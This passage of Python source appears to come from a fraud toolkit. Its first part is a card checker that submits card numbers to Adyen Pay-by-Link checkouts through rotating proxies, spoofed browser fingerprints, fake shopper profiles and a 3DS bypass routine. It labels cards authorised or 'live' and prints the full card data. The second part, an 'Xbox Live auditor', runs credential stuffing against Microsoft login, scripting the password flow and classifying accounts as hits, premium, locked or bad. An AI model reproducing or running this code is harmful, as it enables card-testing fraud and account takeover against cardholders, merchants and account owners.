        cookie_hdr = _adyen_cookies(session)
        if cookie_hdr:
            hdr["Cookie"] = cookie_hdr

        out = {}
        for retry in range(max_retries):
            try:
                r = _adyen_get(session, setup_url, headers=hdr, timeout=12)
                status = _adyen_status(r)
                d = _adyen_json(r)
                sid_full = d.get('sessionId') or ''
                if status == 200 and isinstance(d, dict) and sid_full:
                    out['setup_status'] = status
                    out['sessionId'] = d.get('sessionId')
                    out['sessionData'] = d.get('sessionData')
                    dc = d.get('dropinConfiguration', {}) or {}
                    out['clientKey'] = dc.get('clientKey')
                    out['environment'] = dc.get('environment', env)
                    out['checkoutAttemptId'] = dc.get('checkoutAttemptId')
                    pl = d.get('paymentLink', {}) or {}
                    if pl.get('amount'):
                        amt = pl['amount']
                        amt_val = amt.get('value')
                        if amt_val is not None:
                            try:
                                out['amount_value'] = int(amt_val)
                            except (ValueError, TypeError):
                                out['amount_value'] = amt_val
                        out['amount_currency'] = amt.get('currency', 'USD')
                    out['pbl_status'] = pl.get('status')
                    out['pbl_reference'] = pl.get('reference')
                    out['pbl_reusable'] = pl.get('reusable', True)
                    out['countryCode'] = pl.get('countryCode')
                    out['returnUrl'] = pl.get('returnUrl')
                    out['shopperLocale'] = pl.get('shopperLocale')
                    th = d.get('theme', {}) or {}
                    if th.get('displayName'):
                        out['merchant'] = th['displayName']
                    out['adyen'] = True
                    out['is_pbl'] = True
                    out['linkId'] = link_id
                    out['pbl_base'] = base
                    out['use_jwe'] = True
                    return out
                elif status == 403:
                    if retry < max_retries - 1:
                        time.sleep(0.5)
                        continue
                    return {'error': 'rate_limited', 'setup_status': 403}
                elif status == 410:
                    return {'error': 'link_expired', 'setup_status': 410}
                elif status == 404:
                    return {'error': 'link_not_found', 'setup_status': 404}
                elif status == 200 and not sid_full:
                    return {'error': 'session_soft_blocked', 'setup_status': 200}
                else:
                    if retry < max_retries - 1:
                        time.sleep(0.3)
                        continue
                    return {'error': f'setup_status_{status}', 'setup_status': status}
            except Exception as e:
                if retry < max_retries - 1:
                    time.sleep(0.3)
                    continue
                return {'error': str(e)[:80], 'setup_status': 0}
        return {'error': 'max_retries_exceeded', 'setup_status': 0}

    def _scrape(self, session, ua=ADYEN_UA):
        hdr = {"User-Agent": ua,
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "en-US,en;q=0.9"}
        merchant = "Adyen Merchant"
        cfg = dict(clientKey=None, sessionId=None, sessionData=None,
                   publicKey=None, environment=None, adyen=False,
                   linkId=None, loadingContext=None, use_jwe=False)
        if 'adyen.link/' in self.url:
            m = re.search(r'adyen\.link/([A-Za-z0-9]{20,})', self.url)
            if m:
                cfg['linkId'] = m.group(1)
                cfg['adyen'] = True
        res = _adyen_get(session, self.url, headers=hdr, timeout=12)
        html = _adyen_text(res)
        t = re.search(r'<title>([^<]+)</title>', html, re.I)
        if t:
            raw_title = t.group(1)
            if 'Pay by Link' in raw_title and ' - ' in raw_title:
                merchant = raw_title.split(' - ', 1)[1].strip()[:30]
            else:
                merchant = raw_title.split('|')[0].split(' - ')[0].strip()[:30]
        if re.search(r'(?:adyen[-.]web|sdk)[/-]6\.', html):
            cfg['use_jwe'] = True
        page_cfg = _adyen_extract_config(html)
        _adyen_merge(cfg, page_cfg)
        cfg['sessionId'] = None
        cfg['sessionData'] = None
        for blk in re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL):
            _adyen_merge(cfg, _adyen_extract_config(blk))
        cfg['sessionId'] = None
        cfg['sessionData'] = None
        if cfg['adyen'] and not cfg.get('clientKey'):
            js_srcs = re.findall(r'src=["\']([^"\']+\.js[^"\']*)', html)
            for js in js_srcs[:6]:
                if not js.startswith('http'):
                    js = urljoin(self.url, js)
                try:
                    jr = _adyen_get(session, js, headers=hdr, timeout=8)
                    jt = _adyen_text(jr)
                    if re.search(r'(?:adyen[-.]web|sdk)[/-]6\.', js) or re.search(r'(?:adyen[-.]web|sdk)[/-]6\.', jt):
                        cfg['use_jwe'] = True
                    _adyen_merge(cfg, _adyen_extract_config(jt))
                except Exception:
                    continue
        cfg['sessionId'] = None
        cfg['sessionData'] = None
        if cfg.get('linkId'):
            lctx = cfg.get('loadingContext') or self._adyen_base(cfg.get('environment', 'live')) + '/'
            pbl = self._bootstrap_pbl(session, cfg['linkId'], lctx, cfg.get('environment', 'live'), ua=ua)
            if pbl.get('error'):
                cfg['setup_error'] = pbl['error']
                cfg['setup_status'] = pbl.get('setup_status', 0)
            else:
                _adyen_merge(cfg, pbl)
                if pbl.get('merchant'):
                    merchant = pbl['merchant']
                if pbl.get('amount_value') is not None:
                    cfg['amount_value'] = pbl['amount_value']
                    cfg['amount_currency'] = pbl.get('amount_currency', 'USD')
                for pk in ('is_pbl', 'pbl_base', 'pbl_status', 'checkoutAttemptId', 'use_jwe'):
                    if pbl.get(pk):
                        cfg[pk] = pbl[pk]
        cfg['merchant'] = merchant
        return cfg

    def _get_config(self, session, ua=ADYEN_UA):
        if self._base_cfg is None:
            self._base_cfg = self._scrape(session, ua=ua)
            return self._base_cfg.copy()
        cfg = self._base_cfg.copy()
        cfg['sessionId'] = None
        cfg['sessionData'] = None
        cfg['checkoutAttemptId'] = None
        cfg['setup_error'] = None
        cfg['setup_status'] = 0
        if cfg.get('is_pbl') and cfg.get('linkId'):
            lctx = cfg.get('loadingContext') or self._adyen_base(cfg.get('environment', 'live')) + '/'
            pbl = self._bootstrap_pbl(session, cfg['linkId'], lctx, cfg.get('environment', 'live'), ua=ua)
            if pbl.get('error'):
                cfg['setup_error'] = pbl['error']
                cfg['setup_status'] = pbl.get('setup_status', 0)
                return cfg
            _adyen_merge(cfg, pbl)
            if pbl.get('merchant'):
                cfg['merchant'] = pbl['merchant']
            if pbl.get('amount_value') is not None:
                cfg['amount_value'] = pbl['amount_value']
                cfg['amount_currency'] = pbl.get('amount_currency', 'USD')
        return cfg

    def _fetch_pubkey(self, session, client_key, env):
        if self._cached_pk:
            return self._cached_pk
        for ver in ('v1', 'v2'):
            url = f"{self._adyen_base(env)}/{ver}/clientKeys/{client_key}"
            try:
                r = _adyen_get(session, url, timeout=8)
                d = _adyen_json(r)
                if isinstance(d, dict) and d.get('publicKey'):
                    self._cached_pk = d['publicKey']
                    return d['publicKey']
            except Exception:
                pass
        return None

    def _pay_session(self, session, encrypted, sid, sdata, ck, env, ua, att_id=None, profile=None):
        url = f"{self._adyen_base(env)}/v1/sessions/{sid}/payments?clientKey={ck}"
        origin = self._get_origin()
        shopper = None
        pm = {"type": "scheme", **encrypted}
        if profile:
            shopper = {
                "first_name": profile.first, "last_name": profile.last,
                "full_name": profile.full_name, "email": profile.email,
                "phone": profile.phone, "street": profile.street,
                "house_number": profile.house_number, "city": profile.city,
                "state": profile.state, "postal_code": profile.zip,
                "country": profile.country,
            }
            pm["holderName"] = shopper["full_name"]
        browser_info = adyen_build_browser_info(profile, ua=ua)
        body = {
            "sessionData": sdata,
            "paymentMethod": pm,
            "clientStateDataIndicator": True,
            "browserInfo": browser_info,
            "channel": "Web",
            "origin": origin,
        }
        if att_id:
            body["checkoutAttemptId"] = att_id
        if profile and shopper:
            body["shopperEmail"] = shopper["email"]
            body["shopperName"] = {"firstName": shopper["first_name"], "lastName": shopper["last_name"]}
            body["telephoneNumber"] = shopper["phone"]
            body["billingAddress"] = {
                "city": shopper["city"], "country": shopper["country"],
                "houseNumberOrName": shopper["house_number"],
                "postalCode": shopper["postal_code"],
                "stateOrProvince": shopper["state"], "street": shopper["street"],
            }
            body["deliveryAddress"] = body["billingAddress"]
            fp = adyen_build_fingerprint_payloads(profile, ua=ua)
            body["browserFingerprintByVersion"] = fp["browser_fingerprint_by_version"]
            body["browserProfile"] = fp["browser_profile"]
        hdr = {
            "Content-Type": "application/json; charset=utf-8",
            "Accept": "application/json",
            "User-Agent": ua,
            "Origin": origin,
            "Referer": self.url,
        }
        cookie_hdr = _adyen_cookies(session)
        if cookie_hdr:
            hdr["Cookie"] = cookie_hdr
        r = _adyen_post(session, url, json=body, headers=hdr, timeout=15)
        return _adyen_json(r)

    def _submit_details(self, session, sid, sdata, ck, env, details, ua=ADYEN_UA):
        pbl = (self._base_cfg or {}).get('pbl_base')
        if pbl and not sid:
            url = f"{pbl}/paymentDetails?clientKey={ck}"
        else:
            url = f"{self._adyen_base(env)}/v1/sessions/{sid}/paymentDetails?clientKey={ck}"
        origin = self._get_origin()
        body = {"sessionData": sdata, "details": details}
        hdr = {"Content-Type": "application/json; charset=utf-8",
               "Accept": "application/json", "User-Agent": ua,
               "Origin": origin, "Referer": self.url}
        cookie_hdr = _adyen_cookies(session)
        if cookie_hdr:
            hdr["Cookie"] = cookie_hdr
        r = _adyen_post(session, url, json=body, headers=hdr, timeout=20)
        return _adyen_json(r)

    def _parse(self, data, result):
        if not isinstance(data, dict):
            result['error'] = 'Non-dict response'
            result['decline_code'] = 'parse_error'
            return result
        psp = data.get('pspReference') or (data.get('action', {}).get('pspReference') if isinstance(data.get('action'), dict) else None)
        if psp:
            result['psp'] = psp
        action = data.get('action')
        if isinstance(action, dict):
            if action.get('url'):
                result['redirect_url'] = action['url']
                result['3ds_url'] = action['url']
            if action.get('type'):
                result['action_type'] = action['type']
            if action.get('token'):
                result['action_token'] = action['token']
        if data.get('returnUrl'):
            result['receipt_url'] = data['returnUrl']
        rc = data.get('resultCode', '')
        if not rc and data.get('status'):
            rc = str(data.get('status'))
        if not rc and ('refusalReason' in data or 'refusalReasonCode' in data):
            rc = 'Refused'
        if rc == 'Authorised':
            result['success'] = True
            result['decline_code'] = 'authorised'
            result['error'] = 'Authorised'
            if not result.get('receipt_url'):
                result['receipt_url'] = data.get('returnUrl') or data.get('url') or data.get('redirectUrl') or self.url
            return result
        if rc in ('Received', 'Pending', 'AuthenticationFinished'):
            result['success'] = False
            result['pending'] = True
            result['decline_code'] = 'pending'
            result['error'] = f"Payment {rc}"
            return result
        if rc in ('RedirectShopper', 'IdentifyShopper', 'ChallengeShopper'):
            result['decline_code'] = '3ds_required'
            act_type = action.get('type', rc) if isinstance(action, dict) else rc
            result['error'] = f"3DS ({act_type})"
            result['is_live'] = True
            return result
        if rc == 'Refused' or 'refusalReason' in data or 'refusalReasonCode' in data:
            reason = data.get('refusalReason', 'Refused')
            rcode = str(data.get('refusalReasonCode', ''))
            mapped = self.REFUSAL_CODE_MAP.get(rcode) or self.DECLINE_MAP.get(
                reason, reason.lower().replace(' ', '_') if reason else 'refused')
            result['decline_code'] = mapped
            result['error'] = f"{reason} ({rcode})" if rcode else reason
            result['is_live'] = mapped in self.LIVE_DECLINE
            return result
        if 'errorCode' in data or 'message' in data:
            msg = data.get('message') or data.get('errorCode') or 'error'
            err_code = str(data.get('errorCode', 'error'))
            result['decline_code'] = err_code
            result['error'] = f"{msg} ({err_code})"
            return result
        result['decline_code'] = rc.lower() if rc else 'unknown'
        result['error'] = f"Adyen: {rc or 'Unknown'}"
        return result

    def _run_core(self, sess, card, result, t0, ua):
        cfg = self._get_config(sess, ua=ua)
        result['merchant'] = cfg.get('merchant', 'Adyen Merchant')
        if cfg.get('amount_value') is not None:
            try:
                val = int(cfg['amount_value'])
                cur = cfg.get('amount_currency', 'USD')
                result['amount'] = f"{cur} {val / 100:.2f}"
            except (ValueError, TypeError):
                result['amount'] = str(cfg['amount_value'])
        if not cfg.get('adyen'):
            result['error'] = "No Adyen checkout detected"
            result['decline_code'] = 'no_adyen'
            result['response_time'] = round(time.time() - t0, 2)
            return result
        if cfg.get('setup_error'):
            err = cfg['setup_error']
            status = cfg.get('setup_status', 0)
            if status == 410 or 'expired' in err.lower():
                result['error'] = f"PBL link expired (status={status})"
                result['decline_code'] = 'link_expired'
            elif status == 404:
                result['error'] = f"PBL link not found (status={status})"
                result['decline_code'] = 'link_not_found'
            elif status == 403:
                result['error'] = f"PBL rate limited (status={status})"
                result['decline_code'] = 'rate_limited'
            elif status == 200 and 'soft' in err.lower():
                result['error'] = f"PBL soft blocked (status={status})"
                result['decline_code'] = 'link_soft_blocked'
            else:
                result['error'] = f"PBL setup failed: {err}"
                result['decline_code'] = 'no_session'
            result['setup_status'] = status
            result['response_time'] = round(time.time() - t0, 2)
            return result
        if cfg.get('pbl_status') and cfg['pbl_status'] not in ('active', 'open', 'paymentPending'):
            result['error'] = f"Pay by Link is {cfg['pbl_status']}"
            result['decline_code'] = 'link_' + str(cfg['pbl_status']).lower()
            result['response_time'] = round(time.time() - t0, 2)
            return result
        ck = cfg.get('clientKey')
        if not ck:
            result['error'] = "Adyen detected but clientKey not found"
            result['decline_code'] = 'no_client_key'
            result['response_time'] = round(time.time() - t0, 2)
            return result
        env = cfg.get('environment', 'live')
        pk = cfg.get('publicKey') or self._fetch_pubkey(sess, ck, env)
        if not pk:
            result['error'] = f"Cannot fetch pubkey for {ck[:20]}…"
            result['decline_code'] = 'no_pubkey'
            result['response_time'] = round(time.time() - t0, 2)
            return result
        try:
            cse = AdyenCSE(pk)
            enc = cse.encrypt_card(card['card'], card['month'], card['year'], card['cvv'],
                                    use_jwe=cfg.get('use_jwe', False))
        except Exception as e:
            result['error'] = f"CSE failed: {e}"
            result['decline_code'] = 'cse_error'
            result['response_time'] = round(time.time() - t0, 2)
            return result
        sid = cfg.get('sessionId')
        sdata = cfg.get('sessionData')
        if not sid or not sdata:
            result['error'] = "PBL returned no session"
            result['decline_code'] = 'no_session'
            result['response_time'] = round(time.time() - t0, 2)
            return result
        profile = AdyenShopperProfile(cfg.get('countryCode') or 'US')
        data = self._pay_session(sess, enc, sid, sdata, ck, env, ua,
                                 att_id=cfg.get('checkoutAttemptId'), profile=profile)
        if not data:
            result['error'] = "Adyen /payments returned empty"
            result['decline_code'] = 'no_session'
            result['response_time'] = round(time.time() - t0, 2)
            return result
        rc = data.get('resultCode', '')
        if rc in ('IdentifyShopper', 'ChallengeShopper', 'RedirectShopper'):
            result['3ds_attempted'] = True
            result['3ds_type'] = rc
            adyen_base = self._adyen_base(env)
            def _submit_wrapped(details):
                return self._submit_details(sess, sid, data.get('sessionData', sdata), ck, env, details, ua=ua)
            resolved = _adyen_bypass_pipeline(sess, data, _submit_wrapped, adyen_base, touch_acs=False)
            if resolved and resolved is not data:
                data = resolved
                result['3ds_resolved'] = True
        result['response_time'] = round(time.time() - t0, 2)
        result['raw_response'] = data
        return self._parse(data, result)

    def hit(self, card: dict, proxy_data: Optional[dict] = None) -> dict:
        """Synchronous hit — runs inside executor. Rotates impersonate + UA per call."""
        t0 = time.time()
        result = dict(
            attempt=1, card=card, success=False,
            decline_code=None, response_time=0,
            merchant='Adyen Merchant',
            proxy_raw=self.proxy_str,
            error=None, raw_response=None, is_live=False, psp=None,
        )
        impersonate = adyen_random_impersonate()
        ua = adyen_random_ua()
        proxies = self._proxy_config()
        try:
            from curl_cffi.requests import Session as _CFFISession
            with _CFFISession(impersonate=impersonate, proxies=proxies, timeout=20) as sess:
                return self._run_core(sess, card, result, t0, ua)
        except Exception as ex:
            result['response_time'] = round(time.time() - t0, 2)
            result['decline_code'] = 'exception'
            result['error'] = str(ex)[:150]
            return result


def adyen_parse_card(card_str: str) -> Optional[dict]:
    parts = [p.strip() for p in card_str.replace("/", "|").split("|")]
    if len(parts) != 4:
        return None
    cc, mm, yy, cvv = parts
    if len(yy) == 2:
        yy = "20" + yy
    if not (cc.isdigit() and len(cc) >= 13 and mm.isdigit() and len(mm) <= 2
            and yy.isdigit() and len(yy) == 4
            and cvv.isdigit() and len(cvv) in (3, 4)):
        return None
    return {"card": cc, "month": mm.zfill(2), "year": yy, "cvv": cvv}


def adyen_fmt_result(r: dict, idx: int) -> str:
    card = r.get("card", {}) or {}
    cc_full = f"{card.get('card','')}|{card.get('month','')}|{card.get('year','')}|{card.get('cvv','')}"
    code = r.get("decline_code") or "?"
    msg = r.get("error") or ""
    dt = r.get("response_time", 0)
    if r.get("success"):
        return (
            f"╔══════════════════════════════╗\n"
            f"║  {WH_OK} <b>ADYEN AUTHORISED</b> #{idx:02d}  ║\n"
            f"╚══════════════════════════════╝\n\n"
            f"{WH_CARD}  <b>Card     :</b> <code>{cc_full}</code>\n"
            f"{WH_ICON}  <b>Merchant :</b> <code>{r.get('merchant','N/A')}</code>\n"
            f"{E_PLAN}  <b>Amount   :</b> <code>{r.get('amount','N/A')}</code>\n"
            f"{E_CLOCK}  <b>Time     :</b> <code>{dt}s</code>\n"
            f"💬  <b>Status   :</b> <code>Authorised</code>"
        )
    live = r.get("is_live")
    tag_icon = WH_FAIL if not live else WH_CARD
    status_label = "LIVE DECLINE" if live else "DECLINED"
    return (
        f"╔══════════════════════════════╗\n"
        f"║  {tag_icon} <b>ADYEN {status_label}</b> #{idx:02d} ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"{WH_CARD}  <b>Card     :</b> <code>{cc_full}</code>\n"
        f"{WH_ICON}  <b>Merchant :</b> <code>{r.get('merchant','N/A')}</code>\n"
        f"{E_PLAN}  <b>Amount   :</b> <code>{r.get('amount','N/A')}</code>\n"
        f"{E_CLOCK}  <b>Time     :</b> <code>{dt}s</code>\n"
        f"💬  <b>Code     :</b> <code>{code}</code>\n"
        f"💬  <b>Message  :</b> <code>{msg[:100]}</code>"
    )


# ▼ P2 END — PASTE P3 (Xbox engine) AFTER THIS LINE ▼


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    XBOX LIVE AUDITOR ENGINE (new)                       ║
# ║    Microsoft OAuth PKCE → Xbox SSO → XBL → XSTS → profile → titles     ║
# ║    → gamepass catalog. Detects: PREMIUM / HIT / FREE / NO_XBOX /        ║
# ║    BAD / LOCKED / ERROR                                                ║
# ╚══════════════════════════════════════════════════════════════════════════╝

XBOX_PROFILES = [
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", "platform": '"Windows"', "mobile": "?0", "ch_ua": '"Chromium";v="131", "Not;A=Brand";v="99"'},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", "platform": '"macOS"', "mobile": "?0", "ch_ua": '"Chromium";v="131", "Not;A=Brand";v="99"'},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", "platform": '"Windows"', "mobile": "?0", "ch_ua": '"Chromium";v="124", "Not;A=Brand";v="99"'},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0", "platform": '"Windows"', "mobile": "?0", "ch_ua": None},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15", "platform": '"macOS"', "mobile": "?0", "ch_ua": None},
    {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1", "platform": '"iOS"', "mobile": "?1", "ch_ua": None},
    {"ua": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36", "platform": '"Android"', "mobile": "?1", "ch_ua": '"Chromium";v="131", "Not;A=Brand";v="99"'},
    {"ua": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36", "platform": '"Android"', "mobile": "?1", "ch_ua": '"Chromium";v="131", "Not;A=Brand";v="99"'},
]

XBOX_MS_CLIENT    = "9199bf20-a13f-4107-85dc-02114787ef48"
XBOX_MS_REDIRECT  = "https://outlook.live.com/mail/"
XBOX_MS_SCOPE     = "https://outlook.office.com/.default openid profile offline_access"
XBOX_MS_COBRAND   = "ab0455a0-8d03-46b9-b18b-df2f57b9e44c"
XBOX_XBL_CLIENT   = "1f907974-e22b-4810-a9de-d9647380c97e"
XBOX_XBL_REDIRECT = "https://www.xbox.com/auth/msa?action=loggedIn&sandboxId=RETAIL&locale_hint=en-IN"
XBOX_XBL_SCOPE    = "xboxlive.signin openid profile offline_access"

XBOX_SKUS = {
    "CFQ7TTC0KHS0": "GamePassUltimate",
    "CFQ7TTC0P85B": "GamePassCore",
    "CFQ7TTC0KGQ8": "PCGamePass",
    "CFQ7TTC0LFLZ": "EAPlay",
    "CFQ7TTC0K5DK": "LiveGold",
    "CFQ7TTC0K6L8": "GamePassConsole",
    "9NKS9M6NGVSX": "GamePassUltimateMonthly",
    "9P6F9C1BRBRN": "GamePassCoreMonthly",
    "9NKX70PB5XF0": "GamePassPC",
}

XBOX_BLOCK_SIGNS = (
    ("tried to sign in too many times", "too_many_attempts"),
    ("too many attempts", "too_many_attempts"),
    ("you've tried to sign in too many times", "too_many_attempts"),
    ("your account has been locked", "account_locked"),
    ("we've locked your account", "account_locked"),
    ("your account is temporarily blocked", "temporarily_blocked"),
    ("we have temporarily blocked", "temporarily_blocked"),
)

XBOX_CHALLENGE_SIGNS = (
    "verify your identity", "we need to verify", "two-step",
    "authenticator", "protect your account", "unusual activity",
    "enter the code", "enter your password again",
    "confirm your identity", "help us protect",
)

XBOX_INTERRUPT_SIGNS = (
    "/interrupt/passkey", "consumers/fido/create",
    "interrupt/passkey/enroll", "/interrupt/proofup",
    "account.live.com/interrupt/",
)

XBOX_SAFE_CHARS = set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789*-._")


def xbox_random_profile():
    return random.choice(XBOX_PROFILES)


def xbox_solve_base(base, loc):
    if not loc:
        return None
    if loc.startswith("http"):
        return loc
    if loc.startswith("//"):
        return "https:" + loc
    if loc.startswith("/"):
        return base.rstrip("/") + loc
    return base.rstrip("/") + "/" + loc


def xbox_invenire_challenge(*fonts):
    for s in fonts:
        if not s:
            continue
        m = re.search(r"challenge=([^&#\"'\s]+)", s)
        if m:
            return m.group(1)
    return None


def xbox_cq(nexus):
    out = []
    for ch in str(nexus):
        if ch in XBOX_SAFE_CHARS:
            out.append(ch)
        elif ch == " ":
            out.append("+")
        else:
            for b in ch.encode("utf-8"):
                out.append(f"%{b:02X}")
    return "".join(out)


def xbox_compone_forma(campi):
    return "&".join(f"{xbox_cq(k)}={xbox_cq(v)}" for k, v in campi.items())


def xbox_interpreta_psft(html):
    ppft = None
    up = None
    m = re.search(r'"sFT"\s*:\s*"([^"]+)"', html)
    if m:
        ppft = m.group(1)
    if not ppft:
        m = re.search(r'sFTTag"\s*:\s*"(.*?)"\s*,\s*"', html, re.DOTALL)
        if m:
            pm = re.search(r'value=\\"([^\\"]+)\\"', m.group(1))
            if pm:
                ppft = pm.group(1)
    if not ppft:
        pm = re.search(r'name="PPFT"[^>]*value="([^"]+)"', html)
        if pm:
            ppft = pm.group(1)
    um = re.search(r'"urlPost"\s*:\s*"([^"]+)"', html)
    if um:
        up = um.group(1).replace("\\u0026", "&").replace("\\/", "/")
    return ppft, up


def xbox_fabrica_pkce():
    verifier = secrets.token_urlsafe(32)
    challenge = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).rstrip(b"=").decode()
    return verifier, challenge


def xbox_spolio(url, drop):
    u = urlparse(url)
    q = parse_qs(u.query)
    for k in drop:
        q.pop(k, None)
    return u._replace(query=urlencode(q, doseq=True)).geturl()


def xbox_auge_param(url, extra):
    u = urlparse(url)
    q = parse_qs(u.query)
    for k, v in extra.items():
        q[k] = [v]
    return u._replace(query=urlencode(q, doseq=True)).geturl()


def xbox_extract_code(url):
    if not url:
        return None
    if "#code=" in url:
        frag = url.split("#", 1)[1]
        return (parse_qs(frag).get("code") or [""])[0] or None
    if "code=" in url:
        q = parse_qs(urlparse(url).query)
        return (q.get("code") or [""])[0] or None
    return None


def xbox_discerne_block(causa):
    r = str(causa).lower()
    if "toomanyattempts" in r or "too many attempts" in r:
        return "too_many_attempts"
    if "accountlocked" in r or "account locked" in r:
        return "account_locked"
    if "temporarilyblocked" in r or "temporarily blocked" in r:
        return "temporarily_blocked"
    return None


def xbox_persentio_challenge(html, url=""):
    h = (html or "").lower()
    u = (url or "").lower()
    for p in XBOX_INTERRUPT_SIGNS:
        if p in u or p in h:
            return "challenge_interrupt"
    for p in XBOX_CHALLENGE_SIGNS:
        if p in h:
            return "challenge_required"
    if "security info" in h and ("pending" in h or "review" in h):
        return "challenge_required"
    return None


def xbox_fabrica_sessio(proxy=None, profile=None):
    prof = profile or xbox_random_profile()
    sessio = requests.Session()
    sessio.verify = False
    headers = {
        "user-agent": prof["ua"],
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    if prof.get("ch_ua"):
        headers["sec-ch-ua"] = prof["ch_ua"]
        headers["sec-ch-ua-mobile"] = prof["mobile"]
        headers["sec-ch-ua-platform"] = prof["platform"]
    sessio.headers.update(headers)
    if proxy:
        sessio.proxies = {"http": proxy, "https": proxy}
    return sessio


def xbox_ms_ingressus(sessio, email, password):
    verifier, challenge = xbox_fabrica_pkce()
    nonce = str(uuid.uuid4())
    uaid = uuid.uuid4().hex
    state = base64.urlsafe_b64encode(json.dumps({
        "id": str(uuid.uuid4()),
        "meta": {"interactionType": "redirect"},
    }).encode()).rstrip(b"=").decode()

    qs = [
        f"client_id={XBOX_MS_CLIENT}",
        f"scope={requests.utils.quote(XBOX_MS_SCOPE, safe='')}",
        f"redirect_uri={requests.utils.quote(XBOX_MS_REDIRECT, safe='')}",
        "response_type=code",
        f"state={state}",
        "response_mode=fragment",
        f"nonce={nonce}",
        f"code_challenge={challenge}",
        "code_challenge_method=S256",
        "x-client-SKU=msal.js.browser",
        "x-client-Ver=5.15.0",
        f"uaid={uaid}",
        "msproxy=1", "issuer=mso", "tenant=common", "ui_locales=en-IN",
        "client_info=1", "jshs=2", "fl=dob%2Cflname%2Cwld",
        f"cobrandid={XBOX_MS_COBRAND}", "clidata=1", "jsh=", "jshp=",
        f"username={requests.utils.quote(email, safe='')}",
        f"login_hint={requests.utils.quote(email, safe='')}",
    ]
    auth_url = "https://login.live.com/oauth20_authorize.srf?" + "&".join(qs)

    try:
        r = sessio.get(auth_url, allow_redirects=True, timeout=25,
                       headers={"referer": "https://login.microsoftonline.com/",
                                "sec-fetch-site": "cross-site"})
    except Exception as e:
        return None, {"type": f"net_{type(e).__name__}"}

    if r.status_code == 429:
        return None, {"type": "rate_limit"}

    ppft1, up1 = xbox_interpreta_psft(r.text)
    if not (ppft1 and up1):
        return None, {"type": "no_ppft"}

    try:
        r2 = sessio.post(
            "https://login.live.com/checkpassword.srf",
            json={"username": email, "password": password, "checkpasswordflowtoken": ""},
            headers={"accept": "application/json",
                     "content-type": "application/json; charset=utf-8",
                     "origin": "https://login.live.com",
                     "referer": auth_url,
                     "client-request-id": uuid.uuid4().hex,
                     "correlationId": uuid.uuid4().hex,
                     "hpgact": "0", "hpgid": "33"},
            timeout=25,
        )
    except Exception as e:
        return None, {"type": f"cp_net_{type(e).__name__}"}

    if r2.status_code == 429:
        return None, {"type": "rate_limit"}
    if r2.status_code != 200:
        return None, {"type": f"cp_{r2.status_code}"}

    try:
        j2 = r2.json()
    except Exception:
        return None, {"type": "cp_non_json"}

    verdict = (j2.get("validationresult") or "").lower()
    if verdict != "succeed":
        detail = j2.get("validationdetail")
        causa = "wrong_password"
        if isinstance(detail, dict):
            causa = detail.get("error") or detail.get("reason") or causa
        elif isinstance(detail, str) and detail:
            causa = detail
        blk = xbox_discerne_block(causa)
        if blk:
            return None, {"type": "locked", "reason": blk}
        return None, {"type": "bad", "reason": str(causa)[:60]}

    vanguard = j2.get("vanguardflowtoken", "")
    pref_url = xbox_spolio(up1, ["contextid", "bk"])
    pref_url = xbox_auge_param(pref_url, {"route": "C524_BL2"})

    try:
        r3 = sessio.post(
            pref_url,
            data=xbox_compone_forma({
                "PPFT": ppft1, "canary": "", "LoginOptions": "1",
                "type": "28", "hpgrequestid": "", "ctx": "",
            }),
            headers={"accept": "text/html,*/*;q=0.8",
                     "content-type": "application/x-www-form-urlencoded",
                     "origin": "https://login.live.com",
                     "referer": up1,
                     "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
                     "sec-fetch-site": "same-origin", "sec-fetch-user": "?1"},
            allow_redirects=False, timeout=25,
        )
    except Exception:
        r3 = None

    ppft2, up2 = ppft1, up1
    if r3 is not None:
        p2, u2 = xbox_interpreta_psft(r3.text)
        if p2 and u2:
            ppft2, up2 = p2, u2

    login_body = xbox_compone_forma({
        "ps": "2", "PPFT": ppft2, "PPSX": "Pass",
        "NewUser": "1", "FoundMSAs": "", "fspost": "0",
        "i21": "0", "CookieDisclosure": "0", "IsFidoSupported": "1",
        "isSignupPost": "0", "isRecoveryAttemptPost": "0", "i13": "0",
        "login": email, "loginfmt": email, "type": "11",
        "LoginOptions": "3", "cpr": "0",
        "passwd": password, "vanguardflowtoken": vanguard,
    })

    try:
        r4 = sessio.post(
            up2, data=login_body,
            headers={"accept": "text/html,*/*;q=0.8",
                     "content-type": "application/x-www-form-urlencoded",
                     "origin": "https://login.live.com",
                     "referer": pref_url,
                     "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
                     "sec-fetch-site": "same-origin", "sec-fetch-user": "?1"},
            allow_redirects=False, timeout=25,
        )
    except Exception:
        return None, {"type": "submit_net"}

    cur = r4
    code = None
    resubmits = 0

    for _hop in range(1, 12):
        loc = cur.headers.get("Location", "") if hasattr(cur, "headers") else ""
        c = xbox_extract_code(loc)
        if c:
            code = c
            break
